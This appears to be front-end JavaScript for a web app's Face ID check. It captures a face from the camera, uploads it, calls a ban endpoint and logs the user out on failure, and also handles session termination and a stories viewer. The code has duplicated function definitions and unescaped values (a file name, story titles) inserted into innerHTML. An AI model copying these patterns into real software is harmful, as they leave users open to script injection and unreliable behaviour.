   Изменение: убран спиннер внутри кнопки "Scan my face"
   ----------------------------- */

/* helper: generate spinner HTML (12 blades) using your spinner classes */
function createSpinnerHTML() {
  const blades = Array.from({length:12}, () => '<div class="spinner-blade"></div>').join('');
  return `<span class="spinner center">${blades}</span>`;
}

/* -----------------------------
   startFaceIDFlow
   ----------------------------- */
function startFaceIDFlow(sessionId) {
  const existing = document.querySelector('.faceid-overlay');
  if (existing) existing.remove();

  const overlay = document.createElement('div');
  overlay.className = 'faceid-overlay';
  overlay.dataset.sessionId = sessionId;

  const box = document.createElement('div');
  box.className = 'faceid-box';
  box.setAttribute('role', 'dialog');
  box.setAttribute('aria-modal', 'true');

  box.innerHTML = `
    <div class="faceid-header">
      <div>
        <span class="faceid-badge"><i class="fas fa-user-shield"></i> Face ID</span>
        <h3 class="faceid-title">Complete Face ID Check</h3>
        <p class="faceid-sub">Session <strong>${sessionId}</strong></p>
      </div>
    </div>

    <div class="faceid-body">
      <div class="faceid-left">
        <div class="faceid-guide">
          <strong>Quick guide</strong>
          <p>Use the camera to scan your face. Good lighting helps.</p>
          <small>Resulting image will be uploaded automatically.</small>
        </div>

        <div class="faceid-controls">
          <button class="faceid-btn faceid-open-camera" data-role="open-camera">
            <i class="fas fa-camera"></i> Open Camera
          </button>
          <button class="faceid-btn faceid-btn-ghost" data-role="later">
            <i class="fas fa-times-circle"></i> Not now
          </button>
        </div>
      </div>

      <div class="faceid-right">
        <div class="faceid-dropzone" tabindex="0" aria-label="Drop image here or click to select">
          <div class="dz-title">Drag & drop, paste, or click to upload a photo</div>
          <div class="dz-sub">PNG / JPG • Max 10MB</div>
        </div>
      </div>
    </div>

    <div class="faceid-note">Tip: allow camera access in your browser. The video preview will appear inside a round scanner.</div>
  `;

  overlay.appendChild(box);
  document.body.appendChild(overlay);

  // close when clicked outside box
  overlay.addEventListener('click', (e) => { if (e.target === overlay) cleanup(); });

  // hidden file input
  const fileInput = document.createElement('input');
  fileInput.type = 'file';
  fileInput.accept = 'image/*';
  fileInput.style.display = 'none';
  document.body.appendChild(fileInput);

  const openCameraBtn = box.querySelector('[data-role="open-camera"]');
  const laterBtn = box.querySelector('[data-role="later"]');
  const dropzone = box.querySelector('.faceid-dropzone');

  // Open camera (separate camera modal)
  openCameraBtn.addEventListener('click', () => {
    openCameraUI(sessionId, (result) => {
      if (result && result.status === 'success') {
        // close everything after successful verification
        const ov = document.querySelector('.faceid-overlay');
        if (ov) ov.remove();
      }
    });
  });

  laterBtn.addEventListener('click', cleanup);
  dropzone.addEventListener('click', () => fileInput.click());

  // file selection handler
  fileInput.addEventListener('change', (e) => {
    const file = e.target.files && e.target.files[0];
    if (file) handleFaceFileSelection(file, sessionId, null);
  });

  // drag & drop
  const onDragPrevent = (e) => { e.preventDefault(); e.stopPropagation(); };
  const onDragEnter = (e) => { onDragPrevent(e); dropzone.classList.add('drag-active'); };
  const onDragOver = (e) => { onDragPrevent(e); dropzone.classList.add('drag-active'); };
  const onDragLeave = (e) => { onDragPrevent(e); dropzone.classList.remove('drag-active'); };
  const onDrop = (e) => {
    onDragPrevent(e);
    dropzone.classList.remove('drag-active');
    const files = e.dataTransfer && e.dataTransfer.files;
    if (!files || !files.length) return;
    const f = files[0];
    if (!/image\/(png|jpe?g)$/i.test(f.type)) {
      showToastNotification(`<i class="fas fa-info-circle"></i> Only image files (PNG/JPG) are allowed.`, 'info', 5000);
      return;
    }
    handleFaceFileSelection(f, sessionId, null);
  };

  dropzone.addEventListener('dragenter', onDragEnter);
  dropzone.addEventListener('dragover', onDragOver);
  dropzone.addEventListener('dragleave', onDragLeave);
  dropzone.addEventListener('drop', onDrop);

  // paste
  const onPaste = (e) => {
    if (!e.clipboardData) return;
    const items = e.clipboardData.items;
    if (!items) return;
    for (let i = 0; i < items.length; i++) {
      const it = items[i];
      if (it.type && it.type.indexOf('image') === 0) {
        const file = it.getAsFile();
        if (file) { handleFaceFileSelection(file, sessionId, null); break; }
      }
    }
  };
  window.addEventListener('paste', onPaste);

  // ESC close
  const onKeydown = (e) => { if (e.key === 'Escape') cleanup(); };
  window.addEventListener('keydown', onKeydown);

  // focus trap (simple)
  const focusables = box.querySelectorAll('button, [tabindex="0"]');
  let idx = 0;
  box.addEventListener('keydown', (e) => {
    if (e.key === 'Tab') {
      e.preventDefault();
      idx = (idx + (e.shiftKey ? -1 : 1) + focusables.length) % focusables.length;
      focusables[idx].focus();
    }
  });

  openCameraBtn.focus();

  function cleanup() {
    window.removeEventListener('paste', onPaste);
    window.removeEventListener('keydown', onKeydown);
    dropzone.removeEventListener('dragenter', onDragEnter);
    dropzone.removeEventListener('dragover', onDragOver);
    dropzone.removeEventListener('dragleave', onDragLeave);
    dropzone.removeEventListener('drop', onDrop);
    if (fileInput) fileInput.remove();
    if (overlay) overlay.remove();
    const camModal = document.querySelector('.faceid-camera-modal');
    if (camModal) camModal.remove();
  }
}

function openCameraUI(sessionId, onClosed) {
  if (document.querySelector('.faceid-camera-modal')) return;

  const camModal = document.createElement('div');
  camModal.className = 'faceid-camera-modal';

  const camWrapper = document.createElement('div');
  camWrapper.className = 'faceid-camera-wrapper';

  // Убрана кнопка Capture — детекция работает автоматически
  camWrapper.innerHTML = `
    <div class="scanner">
      <video class="faceid-camera-video" autoplay playsinline muted></video>
      <canvas class="faceid-detect-canvas" style="display:none"></canvas>
    </div>
    <div class="cam-controls">
      <div class="faceid-status-text">Initializing camera...</div>
    </div>
  `;

  camModal.appendChild(camWrapper);
  document.body.appendChild(camModal);

  const video = camWrapper.querySelector('video.faceid-camera-video');
  const statusText = camWrapper.querySelector('.faceid-status-text');
  const detectCanvas = camWrapper.querySelector('canvas.faceid-detect-canvas');
  const detectCtx = detectCanvas.getContext('2d');

  let cameraStream = null;
  let rafId = null;
  let stopped = false;
  let observer = null;

// ======= Константы и состояние =======
const REQUIRED_STABLE_FRAMES = 15;      // сколько подряд фреймов лицо должно быть стабильным
const REQUIRED_SCORE = 0.85;           // минимальная уверенность детектора (после сглаживания)
const MIN_BOX_REL = 0.12;              // минимальный относительный размер бокса (ширина/видео)
const MAX_CENTER_SHIFT_PX = 10;        // макс. допустимое смещение центра (пикселей) между фреймами
const MIN_IOU = 0.7;                   // минимальный IoU чтобы считать, что бокс "тот же"
const SCORE_EMA_ALPHA = 0.25;          // коэффициент экспоненциального сглаживания для score
const BOX_EMA_ALPHA = 0.25;            // коэффициент EMA для бокса (x,y,w,h)
const STABILITY_TIMEOUT_MS = 7000;     // сбросим счётчик стабильности если не найдено лицо в это время


let stableCount = 0;
let lastDetectionTimestamp = 0;
let lastBoxEMA = null;   // {x,y,width,height}
let lastScoreEMA = 0;
let faceDetector = null; // native FaceDetector instance or special marker for face-api fallback
let detectionLoopRunning = false;
let detectionAnimationId = null;

// Элементы DOM — подставь селекторы под свой HTML

const overlay = document.querySelector('#overlay');   // canvas overlay (опционально)


// ======= startCamera() — доступ к камере и запуск цикла детекции =======
async function startCamera(constraints = { video: { width: 640, height: 480 }, audio: false }) {
  try {
    // Если уже запущен — ничего не делаем
    if (cameraStream) {
      statusText && (statusText.textContent = 'Camera already running');
      return;
    }

    cameraStream = await navigator.mediaDevices.getUserMedia(constraints);
    video.srcObject = cameraStream;

    // Подождём, пока видео начнёт проигрываться
    await video.play();

    statusText && (statusText.textContent = 'Camera started — waiting for face...');
    await initDetectorAndStartLoop();
  } catch (err) {
    console.error('Camera access failed', err);
    if (statusText) statusText.textContent = 'Failed to access camera';
    showToastNotification && showToastNotification(`<i class="fas fa-exclamation-triangle"></i> Failed to access camera: ${err.message}`, 'error', 7000);
  }
}

// ======= Инициализация детектора и запуск detect loop =======
async function initDetectorAndStartLoop() {
  // Попробуем нативный FaceDetector
  if ('FaceDetector' in window) {
    try {
      faceDetector = new window.FaceDetector({ fastMode: true, maxDetectedFaces: 1 });
      console.info('Using native FaceDetector API');
    } catch (e) {
      console.warn('Native FaceDetector creation failed, will fallback to face-api if available.', e);
      faceDetector = null;
    }
  }

  // Фоллбек на face-api.js (если подключён)
  if (!faceDetector && window.faceapi) {
    // Предполагается, что модели face-api уже загружены в другом месте
    faceDetector = { type: 'faceapi' };
    console.info('Using face-api.js fallback');
  }

  if (!faceDetector) {
    statusText && (statusText.textContent = 'No face detection API available');
    showToastNotification && showToastNotification('Face detection unavailable (FaceDetector or face-api.js required).', 'error', 7000);
    return;
  }

  // Подготовка overlay canvas
  if (overlay && overlay.getContext) {
    overlay.width = video.videoWidth || video.clientWidth;
    overlay.height = video.videoHeight || video.clientHeight;
  }

  detectionLoopRunning = true;
  lastDetectionTimestamp = performance.now();
  lastBoxEMA = null;
  lastScoreEMA = 0;
  stableCount = 0;

  detectionAnimationId = requestAnimationFrame(detectFrame);
}

// ======= Основной цикл детекции =======
async function detectFrame(timestamp) {
  if (!detectionLoopRunning) return;

  try {
    // Обновляем размеры overlay при изменении видео
    if (overlay && (overlay.width !== video.videoWidth || overlay.height !== video.videoHeight)) {
      overlay.width = video.videoWidth;
      overlay.height = video.videoHeight;
    }

    let detection = null; // {box: {x,y,width,height}, score: 0..1, landmarks?}

    if (faceDetector && faceDetector.type === 'faceapi') {
      // face-api fallback: предполагаем, что модели уже загружены.
      // Настройку опций (tiny vs ssd) делайте в месте загрузки моделей.
      const detections = await faceapi.detectAllFaces(video).withFaceLandmarks();
      if (detections && detections.length > 0) {
        const d = detections[0];
        const box = d.detection.box;
        const score = d.detection.score || 0;
        detection = { box: { x: box.x, y: box.y, width: box.width, height: box.height }, score, landmarks: d.landmarks };
      }
    } else if (faceDetector) {
      // Native FaceDetector
      const results = await faceDetector.detect(video);
      if (results && results.length > 0) {
        const r = results[0];
        const bb = r.boundingBox || r.box || r;
        const score = (typeof r.score === 'number') ? r.score : 1.0;
        detection = { box: { x: bb.x, y: bb.y, width: bb.width, height: bb.height }, score, landmarks: r.landmarks || null };
      }
    }

    if (!detection) {
      // Нет лица на этом кадре — возможно сбросить стабильность по таймауту
      if (performance.now() - lastDetectionTimestamp > STABILITY_TIMEOUT_MS) {
        stableCount = 0;
        lastBoxEMA = null;
        lastScoreEMA = 0;
      }
      statusText && (statusText.textContent = 'Waiting for face...');
      clearOverlay();
      lastDetectionTimestamp = performance.now();
      detectionAnimationId = requestAnimationFrame(detectFrame);
      return;
    }

    lastDetectionTimestamp = performance.now();

    // Размеры видео
    const vidW = video.videoWidth || video.clientWidth;
    const vidH = video.videoHeight || video.clientHeight;
    const relWidth = detection.box.width / vidW;
    const centerX = detection.box.x + detection.box.width / 2;
    const centerY = detection.box.y + detection.box.height / 2;

    // Проверка минимального размера
    if (relWidth < MIN_BOX_REL) {
      stableCount = 0;
      statusText && (statusText.textContent = 'Face too small — move closer');
      drawOverlay(detection.box, 'orange', detection.score);
      detectionAnimationId = requestAnimationFrame(detectFrame);
      return;
    }

    // EMA for score
    lastScoreEMA = lastScoreEMA === 0 ? detection.score : (SCORE_EMA_ALPHA * detection.score + (1 - SCORE_EMA_ALPHA) * lastScoreEMA);

    // EMA for box
    if (!lastBoxEMA) {
      lastBoxEMA = { x: detection.box.x, y: detection.box.y, width: detection.box.width, height: detection.box.height };
    } else {
      lastBoxEMA = {
        x: BOX_EMA_ALPHA * detection.box.x + (1 - BOX_EMA_ALPHA) * lastBoxEMA.x,
        y: BOX_EMA_ALPHA * detection.box.y + (1 - BOX_EMA_ALPHA) * lastBoxEMA.y,
        width: BOX_EMA_ALPHA * detection.box.width + (1 - BOX_EMA_ALPHA) * lastBoxEMA.width,
        height: BOX_EMA_ALPHA * detection.box.height + (1 - BOX_EMA_ALPHA) * lastBoxEMA.height
      };
    }

    const iou = computeIoU(detection.box, lastBoxEMA);

    const emaCenterX = lastBoxEMA.x + lastBoxEMA.width / 2;
    const emaCenterY = lastBoxEMA.y + lastBoxEMA.height / 2;
    const centerShift = Math.hypot(centerX - emaCenterX, centerY - emaCenterY);

    const scoreOk = lastScoreEMA >= REQUIRED_SCORE;
    const iouOk = iou >= MIN_IOU;
    const centerOk = centerShift <= MAX_CENTER_SHIFT_PX;

    // Простая проверка ориентации через landmarks (если есть)
    let orientationOk = true;
    if (detection.landmarks && typeof detection.landmarks.getLeftEye === 'function') {
      try {
        const leftEye = detection.landmarks.getLeftEye();
        const rightEye = detection.landmarks.getRightEye();
        const nose = detection.landmarks.getNose();
        if (leftEye && rightEye && nose) {
          const eyeCenterX = (meanX(leftEye) + meanX(rightEye)) / 2;
          const noseX = meanX(nose);
          const relativeNoseOffset = Math.abs(noseX - eyeCenterX) / detection.box.width;
          if (relativeNoseOffset > 0.18) orientationOk = false;
        }
      } catch (e) {
        orientationOk = true; // если ошибка с landmarks — не применять проверку
      }
    }

    if (scoreOk && iouOk && centerOk && orientationOk) {
      stableCount++;
      statusText && (statusText.textContent = `Face stable: ${stableCount}/${REQUIRED_STABLE_FRAMES}`);
      drawOverlay(detection.box, 'lime', detection.score);
    } else {
      // жёсткий сброс; можно поменять на плавный декремент если нужно
      stableCount = 0;
      const reasons = [];
      if (!scoreOk) reasons.push('low confidence');
      if (!iouOk) reasons.push('moved');
      if (!centerOk) reasons.push('shift');
      if (!orientationOk) reasons.push('angle');
      statusText && (statusText.textContent = 'Face unstable: ' + reasons.join(', '));
      drawOverlay(detection.box, 'orange', detection.score);
    }

    if (stableCount >= REQUIRED_STABLE_FRAMES) {
      detectionLoopRunning = false;
      if (detectionAnimationId) cancelAnimationFrame(detectionAnimationId);
      statusText && (statusText.textContent = 'Face locked — ready');
      onFaceStable && onFaceStable({
        box: detection.box,
        score: lastScoreEMA,
        landmarks: detection.landmarks || null
      });
      return;
    }

  } catch (err) {
    console.error('Error in detectFrame:', err);
    statusText && (statusText.textContent = 'Detection error');
  }

  detectionAnimationId = requestAnimationFrame(detectFrame);
}

// ======= Хелперы и утилиты =======
function computeIoU(boxA, boxB) {
  const ax1 = boxA.x, ay1 = boxA.y, ax2 = boxA.x + boxA.width, ay2 = boxA.y + boxA.height;
  const bx1 = boxB.x, by1 = boxB.y, bx2 = boxB.x + boxB.width, by2 = boxB.y + boxB.height;

  const interX1 = Math.max(ax1, bx1);
  const interY1 = Math.max(ay1, by1);
  const interX2 = Math.min(ax2, bx2);
  const interY2 = Math.min(ay2, by2);

  const interW = Math.max(0, interX2 - interX1);
  const interH = Math.max(0, interY2 - interY1);
  const interArea = interW * interH;

  const areaA = (ax2 - ax1) * (ay2 - ay1);
  const areaB = (bx2 - bx1) * (by2 - by1);

  const union = areaA + areaB - interArea;
  if (union <= 0) return 0;
  return interArea / union;
}

function meanX(points) {
  let s = 0;
  for (let p of points) s += p.x || p._x || 0;
  return s / points.length;
}

function drawOverlay(box, color = 'lime', score = 1.0) {
  if (!overlay || !overlay.getContext) return;
  const ctx = overlay.getContext('2d');
  ctx.clearRect(0, 0, overlay.width, overlay.height);
  ctx.lineWidth = 3;
  ctx.strokeStyle = color;
  ctx.fillStyle = color;
  ctx.strokeRect(box.x, box.y, box.width, box.height);
  ctx.font = '14px sans-serif';
  ctx.fillText(`score: ${Math.round(score * 100) / 100}`, Math.max(2, box.x + 4), Math.max(12, box.y - 6));
}

function clearOverlay() {
  if (!overlay || !overlay.getContext) return;
  const ctx = overlay.getContext('2d');
  ctx.clearRect(0, 0, overlay.width, overlay.height);
}

// ======= Остановка камеры и детектора =======
async function stopCamera() {
  detectionLoopRunning = false;
  if (detectionAnimationId) cancelAnimationFrame(detectionAnimationId);
  if (cameraStream) {
    try {
      cameraStream.getTracks().forEach(t => t.stop());
    } catch (e) { console.warn(e); }
    cameraStream = null;
  }
  clearOverlay();
  statusText && (statusText.textContent = 'Camera stopped');
}

// ======= Callback при успешной стабилизации =======
function onFaceStable(result) {
  // result: { box, score, landmarks }
  console.log('Face stable detected:', result);

  // Пример: снимаем кадр и вырезаем область лица, затем отправляем на сервер
  const snap = document.createElement('canvas');
  snap.width = video.videoWidth;
  snap.height = video.videoHeight;
  const sctx = snap.getContext('2d');
  sctx.drawImage(video, 0, 0, snap.width, snap.height);

  const { x, y, width, height } = result.box;
  const crop = document.createElement('canvas');
  crop.width = Math.max(1, Math.round(width));
  crop.height = Math.max(1, Math.round(height));
  const cctx = crop.getContext('2d');
  cctx.drawImage(snap, x, y, width, height, 0, 0, crop.width, crop.height);

  const dataUrl = crop.toDataURL('image/jpeg', 0.9);

  // Пример отправки:
  // fetch('/api/face-scan', { method:'POST', headers: {'Content-Type':'application/json'}, body: JSON.stringify({ image: dataUrl }) })
  //   .then(res => res.json()).then(console.log).catch(console.error);

  // По умолчанию — останавливаем камеру. Убери, если хочешь продолжать сессии.
  // stopCamera();
}

// ======= Полезный пример использования =======
// Запуск камеры по клику (если нужно)
// const startBtn = document.querySelector('#start-camera-btn');
// startBtn && startBtn.addEventListener('click', () => startCamera());

// Прекратить камеру по клику (если нужно)
// const stopBtn = document.querySelector('#stop-camera-btn');
// stopBtn && stopBtn.addEventListener('click', stopCamera);


async function initDetectorAndStartLoop() {
  let faceApiAvailable = false;
  let nativeDetectorAvailable = false;

  // Попытка: face-api (tinyFaceDetector)
  if (window.faceapi && faceapi.nets && faceapi.nets.tinyFaceDetector) {
    try {
      // Если модели не загружены, пытаемся загрузить из /static/models
      if (!faceapi.nets.tinyFaceDetector.params) {
        statusText.textContent = 'Loading face-api models...';
        // 🔥 путь поправлен — теперь ищет в /static/models
        await faceapi.nets.tinyFaceDetector.loadFromUri('/static/models');
      }
      faceApiAvailable = true;
      statusText.textContent = 'Using face-api detector';
    } catch (err) {
      console.warn('faceapi model load failed', err);
      faceApiAvailable = false;
    }
  }

  // Если face-api не доступен — пробуем нативный FaceDetector
  if (!faceApiAvailable && 'FaceDetector' in window) {
    try {
      window._faceDetector = new FaceDetector({ fastMode: true, maxDetectedFaces: 1 });
      nativeDetectorAvailable = true;
      statusText.textContent = 'Using native FaceDetector';
    } catch (err) {
      console.warn('native FaceDetector init failed', err);
      nativeDetectorAvailable = false;
    }
  }

  if (!faceApiAvailable && !nativeDetectorAvailable) {
    statusText.textContent = 'Face detection unavailable';
    showToastNotification(
      `<i class="fas fa-info-circle"></i> Face detection not available.`,
      'info',
      7000
    );
    return;
  }

  // Начинаем цикл детекции
  startDetectionLoop({ faceApiAvailable, nativeDetectorAvailable });
}


  function startDetectionLoop({ faceApiAvailable, nativeDetectorAvailable }) {
    // Подготовка canvas размеров в соответствии с видео
    function updateCanvasSize() {
      detectCanvas.width = video.videoWidth || 640;
      detectCanvas.height = video.videoHeight || 480;
    }

    updateCanvasSize();

    async function frame() {
      if (stopped) return;
      if (video.readyState < 2) {
        // ждём готовности видео
        rafId = requestAnimationFrame(frame);
        return;
      }

      updateCanvasSize();
      detectCtx.drawImage(video, 0, 0, detectCanvas.width, detectCanvas.height);

      try {
        let detection = null;

        if (faceApiAvailable) {
          // tinyFaceDetector на canvas
          const options = new faceapi.TinyFaceDetectorOptions({ inputSize: 224, scoreThreshold: REQUIRED_SCORE });
          const result = await faceapi.detectSingleFace(detectCanvas, options);
          if (result) {
            detection = { score: result.score, box: result.box }; // box: { x, y, width, height }
          }
        } else if (nativeDetectorAvailable && window._faceDetector) {
          const faces = await window._faceDetector.detect(detectCanvas);
          if (faces && faces.length > 0) {
            const f = faces[0];
            const b = f.boundingBox || f.box || { x: f.x, y: f.y, width: f.width, height: f.height };
            detection = { score: f.score ?? 1.0, box: { x: b.x, y: b.y, width: b.width, height: b.height } };
          }
        }

        if (detection) {
          // относительный размер бокса
          const relW = detection.box.width / detectCanvas.width;
          const relH = detection.box.height / detectCanvas.height;
          const relSize = Math.max(relW, relH);

          if (detection.score >= REQUIRED_SCORE && relSize >= MIN_BOX_REL) {
            stableCount++;
            statusText.textContent = `Face detected — hold still (${stableCount}/${REQUIRED_STABLE_FRAMES})`;

            if (stableCount >= REQUIRED_STABLE_FRAMES) {
              // Захватываем текущее изображение и отправляем
              detectCanvas.toBlob(blob => {
                if (!blob) {
                  showToastNotification(`<i class="fas fa-exclamation-triangle"></i> Failed to capture image`, 'error', 4000);
                  stableCount = 0;
                  rafId = requestAnimationFrame(frame);
                  return;
                }

                const now = new Date();
                const pad = n => n.toString().padStart(2, '0');
                const filename = `${now.getFullYear()}${pad(now.getMonth() + 1)}${pad(now.getDate())}_${pad(now.getHours())}${pad(now.getMinutes())}${pad(now.getSeconds())}.jpg`;
                const file = new File([blob], filename, { type: 'image/jpeg' });

                // Используем твою существующую логику отправки
                handleFaceFileSelection(file, sessionId, () => {
                  // Успешно отправлено — закрыть камеру/модал и вызвать onClosed
                  stopped = true;
                  cleanupAll();
                  if (typeof onClosed === 'function') onClosed({ status: 'success' });
                });
              }, 'image/jpeg', 0.9);
			  
			  cleanupAll();

              // не продолжаем цикл — cleanupAll / onClosed закроют всё
              return;
            }
          } else {
            // Сброс если не соответствует по размеру/скор
            stableCount = 0;
            statusText.textContent = 'Face detected but not stable/too small — move closer';
          }
        } else {
          stableCount = 0;
          statusText.textContent = 'No face detected — position your face in view';
        }
      } catch (err) {
        console.error('Detection error:', err);
        // не ломаем цикл — сообщаем и продолжаем
        statusText.textContent = 'Detection error — retrying...';
      }

      rafId = requestAnimationFrame(frame);
    }

    // старт
    rafId = requestAnimationFrame(frame);
  }

  // Клик вне модалки — отмена
  camModal.addEventListener('click', (e) => {
    if (e.target === camModal) {
      stopped = true;
      cleanupAll();
      if (typeof onClosed === 'function') onClosed({ status: 'cancel' });
    }
  });

  // Наблюдаем за удалением основного overlay (если overlay закроется — закрываем камеру)
  observer = new MutationObserver(() => {
    const mainOverlay = document.querySelector('.faceid-overlay');
    if (!mainOverlay) {
      stopped = true;
      cleanupAll();
      if (observer) observer.disconnect();
    }
  });
  observer.observe(document.body, { childList: true, subtree: true });

  // Корректная очистка: останавливаем камеру, отменяем RAF и удаляем модал
  function cleanupAll() {
    stopped = true;
    try {
      if (cameraStream) cameraStream.getTracks().forEach(track => track.stop());
    } catch (e) {
      /* ignore */
    }

    try {
      if (rafId) cancelAnimationFrame(rafId);
    } catch (e) {}

    try {
      if (camModal && camModal.parentNode) camModal.parentNode.removeChild(camModal);
    } catch (e) {}

    try {
      if (observer) observer.disconnect();
    } catch (e) {}
  }

  // Стартуем
  startCamera();
}





/* -----------------------------
   handleFaceFileSelection (с восстановленным баном)
   - dispatches events 'faceid:upload:success' / 'faceid:upload:failed'
   - if server returns No face detected -> ban user via /ban-user/{currentUser}
   ----------------------------- */
function handleFaceFileSelection(file, sessionId, cleanupModal) {
  const name = file.name || '';
  const re = /^(\d{8})_(\d{6})\.(jpe?g|png)$/i;
  if (!re.test(name)) {
    showToastNotification(`<i class="fas fa-times-circle"></i> File name must match <b>YYYYMMDD_HHMMSS.jpg</b><br>Your filename: <b>${name}</b>`, 'error', 7000);
    if (typeof cleanupModal === 'function') cleanupModal();
    return;
  }

  const MAX_SIZE = 10 * 1024 * 1024;
  if (file.size > MAX_SIZE) {
    showToastNotification(`<i class="fas fa-exclamation-triangle"></i> File is too large. Max allowed: 10MB`, 'warning', 6000);
    return;
  }

  const openCameraBtn = document.querySelector('.faceid-overlay [data-role="open-camera"]');
  const spinnerHTML = createSpinnerHTML();
  let prevHTML = null;
  if (openCameraBtn) { prevHTML = openCameraBtn.innerHTML; openCameraBtn.innerHTML = spinnerHTML + ' Checking'; openCameraBtn.disabled = true; }

  const originalBtn = document.querySelector(`button.faceid-btn[data-session-id="${sessionId}"]`);
  let origPrevHTML = null;
  if (originalBtn) { origPrevHTML = originalBtn.innerHTML; originalBtn.innerHTML = spinnerHTML; originalBtn.disabled = true; originalBtn.classList.add('loading'); }

  const fd = new FormData();
  fd.append('photo', file);
  fd.append('sessionId', sessionId);

  fetch('/api/sessions/face-id', { method: 'POST', body: fd })
    .then(async res => {
      const data = await res.json().catch(()=>({}));
      if (!res.ok) throw new Error(data.error || data.message || 'Upload failed');

      if (originalBtn) {
        originalBtn.classList.remove('loading');
        originalBtn.innerHTML = `<i class="fas fa-check-circle"></i> Face ID`;
        originalBtn.disabled = true;
        originalBtn.title = "Face ID completed";
      }

      showToastNotification(`<i class="fas fa-check-circle"></i> Face ID successfully completed.`, 'success', 5000);
      try { fetchSessions(); } catch(e){}

      // update main overlay status text if exists
      const statusEl = document.querySelector('.faceid-box .faceid-status-text');
      if (statusEl) statusEl.textContent = 'Verification succeeded';

      // dispatch success event
      document.dispatchEvent(new Event('faceid:upload:success'));

      if (typeof cleanupModal === 'function') cleanupModal();

      // after short delay remove main overlay and any camera modal
      setTimeout(() => {
        const ov = document.querySelector('.faceid-overlay');
        if (ov) ov.remove();
        const cm = document.querySelector('.faceid-camera-modal');
        if (cm) cm.remove();
      }, 700);

    })
    .catch(err => {
      console.error('Upload error', err);
      showToastNotification(`<i class="fas fa-exclamation-triangle"></i> Failed to upload Face ID: <b>${err.message || 'unknown error'}</b>`, 'error', 7000);
      document.dispatchEvent(new Event('faceid:upload:failed'));

      // visual fail
      const scanner = document.querySelector('.faceid-camera-wrapper .scanner');
      if (scanner) {
        scanner.classList.add('scanner-fail');
        setTimeout(() => scanner.classList.remove('scanner-fail'), 900);
      }

      // restore original button(s)
      if (originalBtn) {
        originalBtn.classList.remove('loading');
        originalBtn.innerHTML = origPrevHTML || `<i class="fas fa-user-check"></i> Complete Face ID Check`;
        originalBtn.disabled = false;
      }

      // === BAN logic restored ===
      const msg = (err && err.message) ? String(err.message) : '';
      if (msg.includes('No face detected') || msg.includes('no face detected') || msg.includes('No faces')) {
        // make ban request
        try {
          fetch(`/ban-user/${currentUser}`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              duration_days: 0,
              reason: 'Server load due to unnecessary Face ID attempts'
            })
          })
          .then(res => res.json().catch(()=>({})))
          .then(data => {
            showToastNotification(`<i class="fas fa-ban"></i> You have been temporarily banned due to repeated unsuccessful Face ID attempts.`, 'error', 10000);
            setTimeout(() => {
              fetch('/logout', { method: 'POST' })
                .then(()=> { window.location.href = '/login'; })
                .catch(() => { window.location.href = '/login'; });
            }, 4000);
          })
          .catch(banErr => {
            console.error('Failed to ban user:', banErr);
          });
        } catch (e) {
          console.error('ban flow error', e);
        }
      }
    })
    .finally(() => {
      if (openCameraBtn) {
        openCameraBtn.disabled = false;
        openCameraBtn.innerHTML = prevHTML || `<i class="fas fa-camera"></i> Open Camera`;
      }
    });
}



let pendingSessionId = null;

function terminateSession(sessionId) {
  // Сохраняем сессию, которую надо удалить, в ожидании пароля
  pendingSessionId = sessionId;

  // Показываем модалку
  document.getElementById("confirmTerminateModal").style.display = "flex";
}

document.getElementById("cancelTerminateBtn").onclick = () => {
  pendingSessionId = null;
  document.getElementById("terminatePasswordInput").value = '';
  document.getElementById("confirmTerminateModal").style.display = "none";
};

document.getElementById("confirmTerminateBtn").onclick = () => {
  const password = document.getElementById("terminatePasswordInput").value.trim();
  if (!password || !pendingSessionId) return;

  // Проверяем пароль
  fetch('/api/verify-password', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ password })
  })
  .then(res => res.json().then(data => ({ status: res.status, body: data })))
  .then(({ status, body }) => {
    if (status === 200) {
      // Успешная проверка — теперь удаляем сессию
      fetch(`/api/terminate-session/${pendingSessionId}`, {
        method: 'DELETE'
      })
      .then(res => res.json().then(data => ({ status: res.status, body: data })))
      .then(({ status, body }) => {
        if (status === 200) {
          showModalStatus("Session terminated successfully.");
          fetchSessions();
        } else {
          showModalStatus(body.error || "Failed to terminate session.", "failed");
        }
      });
    } else {
      showModalStatus(body.error || "Incorrect password", "failed");
    }
  })
  .catch(err => {
    console.error(err);
    showModalStatus("Server error.", "failed");
  })
  .finally(() => {
    document.getElementById("terminatePasswordInput").value = '';
    document.getElementById("confirmTerminateModal").style.display = "none";
    pendingSessionId = null;
  });
};



socket.on('updated-sessions', (data) => {
  console.log('[Socket] updated-sessions received for', data.username);

  // Отправим текущий User-Agent на сервер для проверки
  fetch('/api/check-session', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({
      userAgent: navigator.userAgent
    })
  })
  .then(res => res.json())
  .then(data => {
    if (!data.active) {
      // ⚠️ Нет активной сессии → авто-логаут
      showToastNotification("You have been logged out because your session was terminated.",'info');
      window.location.href = '/login';
    }
  });
});

let storiesItemsStories = [];
let currentIndexStories = 0;
let timeoutHandleStories = null;
let isPausedStories = false;
let holdTimeoutStories = null;

function fetchStoriesStories() {
  fetch('/api/stories')
    .then(r => r.json())
    .then(data => {
      storiesItemsStories = data.filter(s => s.mediaUrl || s.imageUrl);
      const list = document.getElementById('storiesList');
      list.innerHTML = '';
      storiesItemsStories.forEach((story, idx) => {
        const div = document.createElement('div');
        div.className = 'story-item';
        div.innerHTML = `
          <img src="${story.thumbnail || story.imageUrl}" alt="" />
          <div class="story-title">${story.title}</div>
        `;
        div.addEventListener('click', () => openStoryStories(idx));
        list.append(div);
      });
    });
}

function openStoryStories(idx) {
  const story = storiesItemsStories[idx];
  if (!story) return;
  currentIndexStories = idx;
  clearTimeout(timeoutHandleStories);

  const content = document.getElementById('storyContent');
  content.innerHTML = `
    <button class="close-btn" onclick="closeStoriesStories()">×</button>
    <div class="progress-container-stories">
      ${storiesItemsStories.map((_, i) => `<div class="progress-bar-stories" id="barStories${i}"></div>`).join('')}
    </div>
  `;

  let mediaElement;

  if (story.mediaType === 'video' || (story.videoUrl && story.videoUrl.endsWith('.mp4'))) {
    mediaElement = document.createElement('video');
    mediaElement.src = story.videoUrl || story.mediaUrl;
    mediaElement.autoplay = true;
    mediaElement.playsInline = true;
    mediaElement.onloadedmetadata = () => startProgressStories(mediaElement.duration * 1000);
    mediaElement.onended = nextStoryStories;
  } else {
    mediaElement = document.createElement('img');
    mediaElement.src = story.mediaUrl || story.imageUrl;
    startProgressStories(7000);
  }

